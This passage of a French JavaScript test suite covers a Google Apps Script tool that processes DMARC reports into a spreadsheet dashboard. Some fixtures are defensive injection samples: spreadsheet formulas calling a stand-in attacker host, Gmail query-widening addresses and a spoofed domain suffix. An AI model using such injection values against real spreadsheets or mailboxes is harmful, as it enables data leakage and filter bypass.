    assert.strictEqual(sh.getRange(ligne, 2).getValues()[0][0], 7, 'la saisie humaine a été réécrite');
});

/* --------------------------------------------------------------------------
 * v1.2.0 — purge
 * ----------------------------------------------------------------------- */

const purger = (p, jours = 180) => p.lire(`archiverEtPurgerAnciennesLignes_(SpreadsheetApp.getActiveSpreadsheet(), ${jours})`);

const classeurAPurger = (options) => {
    const p = chargerProjet(options);
    poserRapport(p, { id: 'vieux', joursAvant: 200, recuIlYa: 199 * UN_JOUR,
        enregistrements: [['1.1.1.1', 5, 'none', 'pass', 'pass'], ['1.1.1.2', 1, 'none', 'fail', 'fail']] });
    poserRapport(p, { id: '=HYPERLINK("https://attaquant.example")', joursAvant: 190, recuIlYa: 189 * UN_JOUR,
        enregistrements: [['1.1.1.3', 2, 'none', 'fail', 'fail']] });
    poserRapport(p, { id: 'recent', enregistrements: [['2.2.2.2', 10, 'none', 'pass', 'pass']] });
    return p;
};

test('purge : archive en deux CSV, puis ne garde que les lignes récentes', () => {
    const p = classeurAPurger();
    const r = purger(p);
    assert.strictEqual(r.rapportsPurges, 2);
    assert.strictEqual(r.enregPurges, 3);
    assert.strictEqual(p.dossier.fichiers.length, 2);
    assert.deepStrictEqual(p.classeur.getSheetByName('Rapports').lignes().map(l => l[0]), ['recent']);
    assert.deepStrictEqual(p.classeur.getSheetByName('Enregistrements').lignes().map(l => l[0]), ['recent']);
    const csv = p.dossier.contenus.get(r.fichiers[1]);
    assert.strictEqual(csv.split('\r\n').length, 1 + 3, 'en-tête + 3 enregistrements');
});

test('défaut v1.2.0 : le CSV d\'archive ne contient pas de formule exécutable', () => {
    const p = classeurAPurger();
    const r = purger(p);
    r.fichiers.forEach((f) => {
        const cellules = p.dossier.contenus.get(f).split('\r\n')
            .flatMap(l => l.match(/("([^"]|"")*"|[^,]*)/g).filter(Boolean))
            .map(c => c.replace(/^"|"$/g, ''));
        assert.ok(!cellules.some(c => /^[=+@]/.test(c)), `${f} contient une formule`);
    });
});

test('défaut v1.2.0 : purge refusée sans dossier d\'archive, rien n\'est touché', () => {
    const p = classeurAPurger({ proprietesScript: {} });
    assert.throws(() => purger(p), /Purge refusée/);
    assert.strictEqual(p.classeur.getSheetByName('Rapports').lignes().length, 3);
});

test('défaut v1.2.0 : purge refusée pendant un traitement (verrou pris)', () => {
    const p = classeurAPurger();
    p.verrou.libre = false;
    assert.throws(() => purger(p), /traitement des rapports est en cours/);
    assert.strictEqual(p.classeur.getSheetByName('Rapports').lignes().length, 3);
    assert.strictEqual(p.dossier.fichiers.length, 0);
});

test('défaut v1.2.0 : la purge réécrit avant d\'effacer — jamais d\'onglet vide entre les deux', () => {
    const p = classeurAPurger();
    ['Rapports', 'Enregistrements'].forEach(n => { p.classeur.getSheetByName(n).operations = []; });
    purger(p);
    ['Rapports', 'Enregistrements'].forEach((n) => {
        const ops = p.classeur.getSheetByName(n).operations;
        assert.strictEqual(ops[0][0], 'setValues', `${n} : ${JSON.stringify(ops)}`);
        assert.ok(ops.filter(o => o[0] === 'clearContent').every(o => o[1] > 2),
            `${n} : effacement qui touche les lignes conservées`);
    });
});

/* --------------------------------------------------------------------------
 * v1.2.0 — tableau de bord (formules seulement : un simulateur ne les évalue pas)
 * ----------------------------------------------------------------------- */

/**
 * Enregistreur universel : toute méthode rend l'objet lui-même, `getRange`
 * rend un enregistreur lié à son adresse, `setFormula(s)` est consigné.
 */
const enregistreur = (formules, adresse = '') => new Proxy(function () {}, {
    get: (cible, nom) => {
        if (nom === 'getRange') return (...a) => enregistreur(formules, a.join(','));
        if (nom === 'setFormula') return (f) => { formules.set(adresse, f); return enregistreur(formules, adresse); };
        if (nom === 'setFormulas') return (fs2) => { formules.set(adresse, fs2); return enregistreur(formules, adresse); };
        if (nom === 'setValues' || nom === 'setValue') return () => enregistreur(formules, adresse);
        if (nom === 'whenFormulaSatisfied') {
            return (f) => { formules.set(`mfc:${formules.size}`, f); return enregistreur(formules, adresse); };
        }
        return (..._a) => enregistreur(formules, adresse);
    },
    apply: () => enregistreur(formules, adresse)
});

const formulesDuTableau = () => {
    const p = chargerProjet();
    const formules = new Map();
    Object.assign(p.sandbox.SpreadsheetApp, {
        newDataValidation: () => enregistreur(formules), newConditionalFormatRule: () => enregistreur(formules),
        BorderStyle: {}
    });
    p.sandbox.Charts = { ChartType: {} };
    p.sandbox.enregistreurTest = { feuille: enregistreur(formules), donnees: enregistreur(formules) };
    p.sandbox.parametresTest = parametresDefaut(p);
    p.lire('construireTableau_(enregistreurTest.feuille, enregistreurTest.donnees, parametresTest)');
    return formules;
};

test('défaut v1.2.0 : le diagnostic de politique ne rend pas de verdict sur « Tous »', () => {
    const f = formulesDuTableau().get('E5:G5');
    assert.ok(f.startsWith('=IF($C$4="Tous","Choisissez un domaine'), f);
    assert.match(f, /VLOOKUP\("SEUIL_PRET_REJECT",'Paramètres'!A:B,2,FALSE\)/);
    assert.doesNotMatch(f, /0\.99|0\.95/, 'seuil écrit en dur dans la formule');
});

test('défaut v1.2.0 : le nom d\'hôte du Top 15 suit l\'IP de sa ligne (formule, pas note)', () => {
    const f = formulesDuTableau().get('47,8,15,1');
    assert.strictEqual(f.length, 15);
    f.forEach(([formule], i) => {
        assert.ok(formule.includes(`C${47 + i}`) && formule.includes("'_CacheIP'!A:B"), formule);
    });
});

/* --------------------------------------------------------------------------
 * v1.3.0 — domaines surveillés
 * ----------------------------------------------------------------------- */

const listerDomaines = (p, domaines) => {
    const sh = p.classeur.getSheetByName('Domaines');
    domaines.forEach(d => sh.appendRow([d, '', '']));
    return sh;
};

test('défaut v1.2.0 : un rapport pour un domaine hors liste n\'est pas enregistré, son fil est conservé', () => {
    const p = chargerProjet();
    listerDomaines(p, ['example.net']);
    const bon = p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml({ id: 'a' }))));
    const intrus = p.gmail.ajouterFil(message(blobXml('b.xml', rapportXml({ id: 'b', domaine: 'invente.example' }))));
    const bilan = p.traiter();

    assert.ok(bon.corbeille);
    assert.ok(!intrus.corbeille, 'le fil hors liste est parti à la corbeille');
    assert.deepStrictEqual(intrus.libelles, ['DMARC-Hors-liste']);
    assert.deepStrictEqual(p.classeur.getSheetByName('Rapports').lignes().map(l => l[0]), ['a']);
    assert.match(bilan, /Rapports hors liste, non enregistrés : 1 \(domaines : invente\.example\)/);
    assert.deepStrictEqual(p.dossier.fichiers, ['a.xml'], 'un rapport hors liste a été archivé');

    // Domaine légitime oublié : on l'ajoute, on retire le libellé, rien n'est perdu.
    p.classeur.getSheetByName('Domaines').appendRow(['invente.example', 'ajouté']);
    intrus.libelles = [];
    p.traiter();
    assert.ok(intrus.corbeille);
    assert.deepStrictEqual(p.classeur.getSheetByName('Rapports').lignes().map(l => l[0]), ['a', 'b']);
});

test('un sous-domaine d\'un domaine listé est accepté ; un faux suffixe ne l\'est pas', () => {
    const surveille = chargerProjet().lire('domaineSurveille_');
    const liste = new Set(['exemple.fr']);
    assert.ok(surveille('exemple.fr', liste));
    assert.ok(surveille('Mail.Exemple.fr.', liste));
    assert.ok(!surveille('autre-exemple.fr', liste));
    assert.ok(!surveille('exemple.fr.attaquant.example', liste));
});

test('mise à jour : l\'onglet Domaines se préremplit avec les domaines déjà connus', () => {
    const p = chargerProjet({ adresses: null });
    poserRapport(p, { id: 'x', domaine: 'Existant.fr' });
    const { domaines, adresses } = p.lire('lireOngletDomaines_(SpreadsheetApp.getActiveSpreadsheet())');
    assert.deepStrictEqual([...domaines], ['existant.fr']);
    assert.strictEqual(adresses.length, 0);
    assert.match(p.classeur.getSheetByName('Domaines').lignes()[0][2], /à vérifier/);
});

/* --------------------------------------------------------------------------
 * v1.4.0 — adresses de réception dans l'onglet Domaines
 * ----------------------------------------------------------------------- */

test('les adresses de la colonne adresse_rua composent la requête Gmail', () => {
    const p = chargerProjet({ adresses: ['DMARC@Exemple.fr', 'rua@autre.fr; rapports@tiers.fr'] });
    p.traiter();
    const requete = p.gmail.recherches[0];
    ['dmarc@exemple.fr', 'rua@autre.fr', 'rapports@tiers.fr'].forEach(a =>
        assert.ok(requete.includes(`deliveredto:${a}`), `${a} absente de ${requete}`));
    assert.match(requete, /-label:DMARC-Erreur -label:DMARC-Hors-liste$/);
});

test('défaut v1.3.0 : une adresse piégée n\'élargit pas la recherche Gmail', () => {
    const p = chargerProjet({ adresses: ['dmarc@exemple.fr', 'x@y.fr OR in:anywhere', 'a@b.fr} OR {is:starred'] });
    const bilan = p.traiter();
    const requete = p.gmail.recherches[0];
    assert.strictEqual(requete, '{deliveredto:dmarc@exemple.fr} -in:trash -label:DMARC-Erreur -label:DMARC-Hors-liste');
    assert.strictEqual((bilan.match(/Adresse de réception ignorée/g) || []).length, 2);
});

test('sans adresse de réception, rien n\'est relevé, et le bilan dit quoi faire', () => {
    const p = chargerProjet({ adresses: [] });
    p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml())));
    const bilan = p.traiter();
    assert.match(bilan, /Aucune adresse de réception valide/);
    assert.match(bilan, /rua=mailto/);
    assert.strictEqual(p.gmail.recherches.length, 0, 'une recherche a été lancée sans adresse');
    assert.ok(!p.gmail.fils[0].corbeille);
    assert.match(p.classeur.getSheetByName('Journal').lignes()[0][2], /Aucune adresse de réception/);
});

test('un onglet Domaines de la v1.3.0 reçoit la colonne adresse_rua sans rien déplacer', () => {
    const p = chargerProjet({ adresses: null });
    const sh = p.classeur.insertSheet('Domaines');
    sh.getRange(1, 1, 3, 2).setValues([['domaine', 'commentaire'], ['exemple.fr', 'note humaine'], ['autre.fr', '']]);
    p.lire('lireOngletDomaines_(SpreadsheetApp.getActiveSpreadsheet())');
    assert.deepStrictEqual([...sh.getRange(1, 1, 1, 3).getValues()[0]], ['domaine', 'commentaire', 'adresse_rua']);
    assert.deepStrictEqual([...sh.getRange(2, 1, 1, 2).getValues()[0]], ['exemple.fr', 'note humaine']);

    // Colonnes dans un ordre libre : l'adresse est retrouvée par son en-tête.
    sh.getRange(2, 3).setValues([['dmarc@exemple.fr']]);
    const { adresses } = p.lire('lireOngletDomaines_(SpreadsheetApp.getActiveSpreadsheet())');
    assert.deepStrictEqual([...adresses], ['dmarc@exemple.fr']);
});

test('liste de domaines vide : rien n\'est filtré, et le bilan le dit', () => {
    const p = chargerProjet();
    const fil = p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml({ domaine: 'nimporte.example' }))));
    assert.match(p.traiter(), /Filtrage des domaines DÉSACTIVÉ/);
    assert.ok(fil.corbeille);
});

/* --------------------------------------------------------------------------
 * v1.3.0 — journal
 * ----------------------------------------------------------------------- */

test('défaut v1.2.0 : chaque passage laisse une ligne au Journal, avec son origine', () => {
    const p = chargerProjet();
    p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml())));
    p.lire('traiterRapportsDmarc({ triggerUid: "123" })');
    const lignes = p.classeur.getSheetByName('Journal').lignes();
    assert.strictEqual(lignes.length, 1);
    assert.strictEqual(lignes[0][1], `déclencheur horaire · v${p.lire('VERSION_DMARC')}`);
    assert.match(lignes[0][2], /Nouveaux rapports : 1/);
    assert.strictEqual(Object.prototype.toString.call(lignes[0][0]), '[object Date]');
});

test('défaut v1.2.0 : un passage sauté (verrou pris) n\'est plus muet', () => {
    const p = chargerProjet();
    p.verrou.libre = false;
    assert.strictEqual(p.lire('traiterRapportsDmarc({ triggerUid: "1" })'), null);
    assert.match(p.classeur.getSheetByName('Journal').lignes()[0][2], /Passage sauté/);
});

test('un échec du traitement est journalisé avant de remonter', () => {
    const p = chargerProjet({ proprietesScript: { DRIVE_FOLDER_ID: 'dossier-supprime' } });
    assert.throws(() => p.traiter());
    assert.match(p.classeur.getSheetByName('Journal').lignes()[0][2], /^ÉCHEC : Le dossier d'archivage/);
});

test('le Journal est borné et le contenu d\'un rapport n\'y devient pas formule', () => {
    const p = chargerProjet();
    const max = p.lire('CONFIG_DMARC.MAX_LIGNES_JOURNAL');
    for (let i = 0; i < max + 5; i += 1) p.lire(`journaliser_(SpreadsheetApp.getActiveSpreadsheet(), "t", "ligne ${i}")`);
    p.lire('journaliser_(SpreadsheetApp.getActiveSpreadsheet(), "t", "=IMPORTXML(\\"https://x\\")")');
    const lignes = p.classeur.getSheetByName('Journal').lignes();
    assert.strictEqual(lignes.length, max);
    assert.strictEqual(lignes[0][2], 'ligne 6', 'les plus anciennes doivent partir en premier');
    assert.ok(!lignes.some(l => l[2] instanceof Formule));
});

/* --------------------------------------------------------------------------
 * v1.3.0 — alertes de silence et période couverte
 * ----------------------------------------------------------------------- */

test('défaut v1.2.0 : un domaine qui ne reçoit plus de rapport déclenche une alerte', () => {
    const p = chargerProjet();
    poserRapport(p, { id: 'ancien', domaine: 'muet.fr', recuIlYa: 5 * UN_JOUR });
    // Des enregistrements récents, pour passer par le chemin complet de la
    // détection et non par sa sortie anticipée.
    poserRapport(p, { id: 'frais', domaine: 'vivant.fr', recuIlYa: 60 * 60 * 1000,
        enregistrements: [['203.0.113.1', 5, 'none', 'pass', 'pass']] });
    poserRapport(p, { id: 'sous', domaine: 'mail.parent.fr', recuIlYa: 60 * 60 * 1000 });
    p.sandbox.domainesTest = new Set(['muet.fr', 'vivant.fr', 'parent.fr', 'nouveau.fr']);
    p.sandbox.parametresTest = parametresDefaut(p);
    const muets = p.lire('detecterAnomalies_(SpreadsheetApp.getActiveSpreadsheet(), parametresTest, domainesTest)')
        .filter(a => a.type === 'SILENCE').map(a => a.domaine).sort();
    assert.deepStrictEqual([...muets], ['muet.fr', 'nouveau.fr']); // tableau du contexte vm : on le recopie

    p.lire('envoyerAlertesSiNecessaire_(SpreadsheetApp.getActiveSpreadsheet(), parametresTest, domainesTest)');
    const corps = p.emailsEnvoyes[0].body;
    assert.match(corps, /muet\.fr — aucun rapport reçu depuis 3 jours \(dernier reçu le \d{1,2} [a-zéû]+ \d{4}\)/);
    assert.match(corps, /nouveau\.fr — aucun rapport reçu depuis 3 jours \(aucun jamais reçu\)/);
});

test('défaut v1.2.0 : l\'alerte dit quelle période couvrent les rapports reçus', () => {
    const p = chargerProjet();
    poserRapport(p, { id: 'arriere', joursAvant: 6, enregistrements: [['198.51.100.1', 20, 'none', 'fail', 'fail']] });
    alerter(p);
    assert.match(p.emailsEnvoyes[0].body, /couvrant du \d{1,2} [a-zéû]+ \d{4} au \d{1,2} [a-zéû]+ \d{4}/);
});

/* --------------------------------------------------------------------------
 * v1.3.0 — seuils, validation, droits, corbeille par message
 * ----------------------------------------------------------------------- */

test('défaut v1.2.0 : les couleurs des taux suivent les seuils de Paramètres', () => {
    const regles = [...formulesDuTableau().entries()].filter(([k]) => k.startsWith('mfc:')).map(([, f]) => f);
    assert.strictEqual(regles.length, 6, 'trois bandes pour C8, trois pour D13:D42');
    regles.forEach(f => assert.match(f, /INDIRECT\("'Paramètres'!A:B"\)/, f));
    assert.ok(regles.some(f => f.includes('C8')) && regles.some(f => f.includes('D13')));
    regles.forEach(f => assert.doesNotMatch(f, /0\.9\d/, `seuil en dur : ${f}`));
});

test('défaut v1.2.0 : « dernier passage » et « dernier rapport » sont deux dates, jamais 1899', () => {
    const f = formulesDuTableau();
    assert.strictEqual(f.get('C2'), "=IF(COUNT('Journal'!A2:A)=0,\"—\",MAX('Journal'!A2:A))");
    assert.strictEqual(f.get('E2'), "=IF(COUNT('Rapports'!M2:M)=0,\"—\",MAX('Rapports'!M2:M))");
});

/* --------------------------------------------------------------------------
 * v1.4.1 — création complète du tableau de bord, langue du classeur
 * ----------------------------------------------------------------------- */

/** Crée le tableau de bord sur le faux classeur, comme le menu. Rend le projet chargé. */
const creerTableau = () => {
    const p = chargerProjet();
    ['Rapports', 'Enregistrements'].forEach((n) => {
        const sh = p.classeur.insertSheet(n);
        const entetes = [...p.lire(n === 'Rapports' ? 'ENTETES_RAPPORTS' : 'ENTETES_ENREG')];
        sh.getRange(1, 1, 1, entetes.length).setValues([entetes]);
    });
    p.lire('creerTableauDeBord()');
    return p;
};

/** Toutes les formules posées dans le classeur, mise en forme conditionnelle comprise. */
const toutesLesFormules = p => p.classeur.getSheets().flatMap(sh => [
    ...[...sh.formules.values()],
    ...sh.reglesMfc.map(r => r.formule)
]);

test('la création du tableau de bord va à son terme, _Données compris et masqué', () => {
    const p = creerTableau();
    const erreurs = p.journal.filter(([niveau, m]) => niveau === 'error' || /Impossible/.test(m));
    assert.deepStrictEqual(erreurs, [], 'la création s\'est interrompue');
    const don = p.classeur.getSheetByName('_Données');
    assert.ok(don, 'onglet _Données absent');
    assert.ok(don.isSheetHidden(), '_Données devrait être masqué');
    assert.ok(don.formules.get('2,1').startsWith('=IFERROR(ARRAYFORMULA(FILTER('));
    assert.strictEqual(p.classeur.getSheetByName('Tableau de bord').graphiques.length, 4);
    ['Paramètres', 'Journal', '_CacheIP'].forEach(n => assert.ok(p.classeur.getSheetByName(n), n));
});

test('la réinitialisation recrée les deux onglets sans heurter le nom existant', () => {
    const p = creerTableau();
    p.sandbox.SpreadsheetApp.getUi = (ui => () => ({ ...ui(), alert: () => 'OK' }))(p.sandbox.SpreadsheetApp.getUi);
    p.lire('creerTableauDeBord()');
    assert.ok(!p.journal.some(([niveau]) => niveau === 'error'), JSON.stringify(p.journal));
    assert.ok(p.classeur.getSheetByName('_Données') && p.classeur.getSheetByName('Tableau de bord'));
});

test('défaut v1.4.0 : aucune formule ne dépend de la langue du classeur (pas de TEXT à motif)', () => {
    // setFormula s'écrit à l'anglaise et Sheets traduit fonctions et
    // séparateurs, jamais le contenu des guillemets : un motif de TEXT reste
    // tel quel, et ses codes dépendent de la langue. Il échouait en français.
    const formules = toutesLesFormules(creerTableau());
    assert.ok(formules.length > 20, `le contrôle ne voit que ${formules.length} formules`);
    formules.flat(2).forEach(f => assert.doesNotMatch(String(f), /\bTEXT\s*\(/, f));
});

test('défaut v1.4.1 : aucun tableau littéral {…} dans les formules posées', () => {
    // Constaté sur un classeur en français : les virgules d'un tableau
    // littéral n'y sont pas traduites en « \\ », et _Données!A2 restait vide.
    // Les accolades à l'intérieur d'une chaîne "…" ne comptent pas.
    const formules = toutesLesFormules(creerTableau()).flat(2).map(String);
    formules.forEach((f) => {
        const horsChaines = f.replace(/"(?:[^"]|"")*"/g, '""');
        assert.doesNotMatch(horsChaines, /[{}]/, f);
    });
    const don = formules.find(f => f.startsWith('=IFERROR(ARRAYFORMULA(FILTER('));
    assert.match(don, /FILTER\(HSTACK\(/);
});

test('défaut v1.2.0 : chaque cellule de Paramètres porte une validation cohérente avec le code', () => {
    const p = chargerProjet();
    p.lire('lireParametres_(SpreadsheetApp.getActiveSpreadsheet())');
    const sh = p.classeur.getSheetByName('Paramètres');
    const valide = p.lire('valeurValide_');
    p.lire('PARAMETRES_DMARC').forEach((param) => {
        const ligne = sh.lignes().findIndex(l => l[0] === param.cle) + 2;
        const regle = sh.validations.get(`${ligne},2`);
        assert.ok(regle && regle.refuseInvalide, `${param.cle} sans validation stricte`);
        [param.defaut, param.min, param.min - 1, (param.max || 1) * 100].forEach((v) => {
            // Un entier non entier n'est pas contrôlable par la règle ; on compare le reste.
            assert.strictEqual(regle.accepte(v), valide(param, v), `${param.cle} = ${v}`);
        });
    });
    // Le cas qui a motivé la règle : 95 au lieu de 0,95.
    const ligne = sh.lignes().findIndex(l => l[0] === 'SEUIL_PRET_REJECT') + 2;
    assert.ok(!sh.validations.get(`${ligne},2`).accepte(95));
});

test('défaut v1.2.0 : un dossier en lecture seule n\'est pas pris pour un dossier accessible en écriture', () => {
    const p = chargerProjet();
    const droit = p.lire('droitEcritureDossier_');
    ['VIEW', 'COMMENT', 'NONE'].forEach((d) => { p.dossier.droit = d; assert.strictEqual(droit(p.dossier), false, d); });
    ['EDIT', 'OWNER', 'ORGANIZER', 'FILE_ORGANIZER'].forEach((d) => {
        p.dossier.droit = d; assert.strictEqual(droit(p.dossier), true, d);
    });
});

test('défaut v1.2.0 : un message arrivé dans le fil pendant le traitement n\'est pas mis à la corbeille', () => {
    const p = chargerProjet();
    const fil = p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml({ id: 'premier' }))));
    const retardataire = message(blobXml('b.xml', rapportXml({ id: 'second' })));
    const lire = fil.getMessages.bind(fil);
    let arrive = false;
    fil.getMessages = () => {
        const instantane = [...lire()];
        if (!arrive) { arrive = true; retardataire.fil = fil; fil.messages.push(retardataire); }
        return instantane;
    };
    p.traiter();
    assert.ok(!retardataire.isInTrash(), 'le message non lu est parti à la corbeille');
    assert.ok(!fil.corbeille);

    // Passage suivant : le retardataire est lu à son tour, le premier message est ignoré.
    p.traiter();
    assert.deepStrictEqual(p.classeur.getSheetByName('Rapports').lignes().map(l => l[0]), ['premier', 'second']);
    assert.ok(fil.corbeille);
});

test('les badges du README suivent VERSION et le nombre réel de cas', () => {
    // Un numéro affiché et faux est pire que pas de numéro : le badge est une
    // copie de VERSION, il doit dériver sous les yeux du banc et non en silence.
    const readme = fs.readFileSync(path.join(RACINE, 'README.md'), 'utf8');
    const version = fs.readFileSync(path.join(RACINE, 'VERSION'), 'utf8').trim();
    const badgeVersion = /badge\/version-([\d.]+)-/.exec(readme);
    if (badgeVersion) assert.strictEqual(badgeVersion[1], version, 'badge de version périmé');
    const badgeTests = /badge\/tests-(\d+)%2F(\d+)/.exec(readme);
    if (badgeTests) {
        assert.strictEqual(Number(badgeTests[2]), cas.length, `badge : ${badgeTests[2]} cas, banc : ${cas.length}`);
    }
    const mention = /\((\d+) cas\)/.exec(readme);
    if (mention) assert.strictEqual(Number(mention[1]), cas.length, 'nombre de cas périmé dans la structure');
});

/* --------------------------------------------------------------------------
 * v1.4.4 — formules et langue du classeur
 * ----------------------------------------------------------------------- */

test('défaut v1.4.3 : dans un classeur en français, aucune formule posée n\'est en erreur d\'analyse', () => {
    const p = creerTableau();
    assert.strictEqual(p.classeur.getSpreadsheetLocale(), 'fr_FR', 'la langue du classeur n\'a pas été rétablie');
    const erreurs = p.classeur.getSheets().flatMap(sh => [...sh.erreursAnalyse.values()]);
    assert.deepStrictEqual(erreurs, []);
    assert.deepStrictEqual(p.classeur.historiqueLangues, ['fr_FR', 'en_US', 'fr_FR']);
});

test('la langue du classeur est rétablie même si la construction échoue', () => {
    const p = chargerProjet();
    ['Rapports', 'Enregistrements'].forEach((n) => {
        const entetes = [...p.lire(n === 'Rapports' ? 'ENTETES_RAPPORTS' : 'ENTETES_ENREG')];
        p.classeur.insertSheet(n).getRange(1, 1, 1, entetes.length).setValues([entetes]);
    });
    const inserer = p.classeur.insertSheet.bind(p.classeur);
    p.classeur.insertSheet = (nom, ...reste) => {
        const sh = inserer(nom, ...reste);
        if (nom === 'Tableau de bord') sh.setHiddenGridlines = () => { throw new Error('panne simulée'); };
        return sh;
    };
    p.lire('creerTableauDeBord()');
    assert.ok(p.journal.some(([, m]) => /panne simulée/.test(m)), 'la panne n\'a pas été signalée');
    assert.strictEqual(p.classeur.getSpreadsheetLocale(), 'fr_FR');
});

test('un classeur déjà en anglais n\'est pas touché', () => {
    const p = chargerProjet();
    p.classeur.langue = 'en_GB';
    p.classeur.historiqueLangues = ['en_GB'];
    ['Rapports', 'Enregistrements'].forEach((n) => {
        const entetes = [...p.lire(n === 'Rapports' ? 'ENTETES_RAPPORTS' : 'ENTETES_ENREG')];
        p.classeur.insertSheet(n).getRange(1, 1, 1, entetes.length).setValues([entetes]);
    });
    p.lire('creerTableauDeBord()');
    assert.deepStrictEqual(p.classeur.historiqueLangues, ['en_GB']);
});

/* --------------------------------------------------------------------------
 * v1.5.0 — onglet Aide
 * ----------------------------------------------------------------------- */

const texteAide = sh => sh.getRange(1, 1, sh.getLastRow(), 3).getValues().flat().map(String);

test('l\'onglet Aide se crée par le menu, sans aucune formule, avec la version qui l\'a écrit', () => {
    const p = chargerProjet();
    p.lire('afficherAide()');
    const sh = p.classeur.getSheetByName('Aide');
    assert.ok(sh, 'onglet Aide absent');
    assert.strictEqual(p.classeur.active, sh, 'l\'onglet Aide n\'est pas affiché');
    assert.strictEqual(sh.formules.size, 0, 'une formule dépendrait de la langue du classeur');
    assert.strictEqual(sh.getRange(2, 3).getValues()[0][0], `v${p.lire('VERSION_DMARC')}`);
    assert.ok(!p.journal.some(([n]) => n === 'error'), JSON.stringify(p.journal));
});

test('l\'aide explique chaque onglet et chaque libellé Gmail que le script crée', () => {
    // Renommer un onglet dans la configuration sans l'expliquer dans l'aide
    // doit se voir ici, pas chez l'utilisateur.
    const p = chargerProjet();
    p.lire('afficherAide()');
    const intitules = new Set(texteAide(p.classeur.getSheetByName('Aide')));
    const c = p.lire('CONFIG_DMARC');
    const t = p.lire('TABLEAU_DMARC');
    [t.FEUILLE, t.DONNEES, c.ONGLET_DOMAINES, c.ONGLET_PARAMETRES, c.ONGLET_JOURNAL, c.ONGLET_RAPPORTS,
        c.ONGLET_ENREG, c.ONGLET_CACHE_IP, c.ONGLET_AIDE, c.ONGLET_DNS, c.ERROR_LABEL, c.LABEL_HORS_LISTE]
        .forEach(nom => assert.ok(intitules.has(nom), `« ${nom} » n'est pas expliqué dans l'aide`));
});

test('l\'aide est régénérée quand la version change, et seulement alors', () => {
    const p = chargerProjet();
    p.lire('afficherAide()');
    const premiere = p.classeur.getSheetByName('Aide');
    p.traiter();
    assert.strictEqual(p.classeur.getSheetByName('Aide'), premiere, 'aide reconstruite sans raison');

    premiere.getRange(2, 3).setValues([['v0.0.1']]);
    p.traiter();
    const seconde = p.classeur.getSheetByName('Aide');
    assert.notStrictEqual(seconde, premiere, 'une aide d\'une autre version est restée en place');
    assert.strictEqual(seconde.getRange(2, 3).getValues()[0][0], `v${p.lire('VERSION_DMARC')}`);
});

test('la création du tableau de bord crée aussi l\'aide', () => {
    assert.ok(creerTableau().classeur.getSheetByName('Aide'));
});

/* --------------------------------------------------------------------------
 * v1.5.1 — filtre Période aligné sur la rétention
 * ----------------------------------------------------------------------- */

test('les choix du filtre Période suivent la rétention et la capacité du graphique', () => {
    const choix = r => [...chargerProjet().lire('choixPeriodes_')(r)];
    assert.deepStrictEqual(choix(180), ['7', '30', '90', '180']);
    assert.deepStrictEqual(choix(365), ['7', '30', '90', '180', '365']);
    assert.deepStrictEqual(choix(45), ['7', '30', '45']);
    assert.deepStrictEqual(choix(1000), ['7', '30', '90', '180', '365', '500'], 'plafond du graphique ignoré');
});

test('défaut v1.5.0 : le tableau de bord ne propose plus de période au-delà de la rétention', () => {
    const p = creerTableau();
    const sh = p.classeur.getSheetByName('Tableau de bord');
    const regle = sh.validations.get('5,3');
    assert.ok(regle && regle.liste, 'pas de liste sur C5');
    assert.deepStrictEqual([...regle.liste], ['7', '30', '90', '180'], 'rétention par défaut : 180 jours');
    assert.ok(!regle.liste.includes('3650'));
    assert.strictEqual(sh.getRange('C5').getValues()[0][0], 30);
});

test('une rétention abaissée ramène le filtre, met la liste à jour et le dit', () => {
    const p = creerTableau();
    const sh = p.classeur.getSheetByName('Tableau de bord');
    sh.getRange('C5').setValues([[180]]);
    const param = p.classeur.getSheetByName('Paramètres');
    const ligne = param.lignes().findIndex(l => l[0] === 'JOURS_RETENTION') + 2;
    param.getRange(ligne, 2).setValues([[90]]);

    const bilan = p.traiter();
    assert.strictEqual(sh.getRange('C5').getValues()[0][0], 90);
    assert.deepStrictEqual([...sh.validations.get('5,3').liste], ['7', '30', '90']);
    assert.match(bilan, /Filtre Période du tableau de bord ramené à 90 jours/);

    // Passage suivant : plus rien à ramener, plus rien à dire.
    assert.doesNotMatch(p.traiter(), /Filtre Période/);
});

/* --------------------------------------------------------------------------
 * v1.6.0 — clé de rapport émetteur|report_id
 * ----------------------------------------------------------------------- */

const xmlDe = (org, id, ip = '203.0.113.5') => rapportXml({ org, id, enregistrements: [[ip, 7, 'pass', 'pass']] });

test('défaut v0 : deux émetteurs peuvent employer le même report_id sans que le second soit perdu', () => {
    // RFC 7489 : le report_id n'est unique que chez un même émetteur.
    const p = chargerProjet();
    p.gmail.ajouterFil(message(blobXml('a.xml', xmlDe('google.com', '12345'))));
    p.gmail.ajouterFil(message(blobXml('b.xml', xmlDe('yahoo.com', '12345', '198.51.100.9'))));
    const bilan = p.traiter();
    assert.match(bilan, /Nouveaux rapports : 2/);
    assert.match(bilan, /Doublons ignorés : 0/);
    const cles = p.classeur.getSheetByName('Rapports').lignes().map(l => l[13]).sort();
    assert.deepStrictEqual(cles, ['google.com|12345', 'yahoo.com|12345']);
    const enr = p.classeur.getSheetByName('Enregistrements').lignes();
    assert.strictEqual(enr.find(l => l[2] === '198.51.100.9')[13], 'yahoo.com|12345');
});

test('le même rapport du même émetteur reste un doublon, y compris relu depuis la feuille', () => {
    const p = chargerProjet();
    p.gmail.ajouterFil(message(blobXml('a.xml', xmlDe('google.com', '12345'))));
    p.traiter();
    p.gmail.ajouterFil(message(blobXml('a.xml', xmlDe('Google.com', '12345'))));
    p.gmail.ajouterFil(message(blobXml('c.xml', xmlDe('yahoo.com', '12345'))));
    const bilan = p.traiter();
    assert.match(bilan, /Doublons ignorés : 1/, 'la casse de l\'émetteur ne doit pas créer un second rapport');
    assert.match(bilan, /Nouveaux rapports : 1/);
});

/** Onglets au format antérieur à la 1.6.0 : 13 colonnes, sans « cle ». */
const classeurAncienFormat = () => {
    const p = chargerProjet();
    const entetesR = p.lire('ENTETES_RAPPORTS').slice(0, 13);
    const entetesE = p.lire('ENTETES_ENREG').slice(0, 13);
    const rap = p.classeur.insertSheet('Rapports');
    const enr = p.classeur.insertSheet('Enregistrements');
    const debut = minuitUtc(1);
    rap.getRange(1, 1, 3, 13).setValues([[...entetesR],
        ["'r-1", 'Google.com', 'x', debut, debut, 'd.fr', 'r', 'r', 'none', 'none', 100, 'f', new Date()],
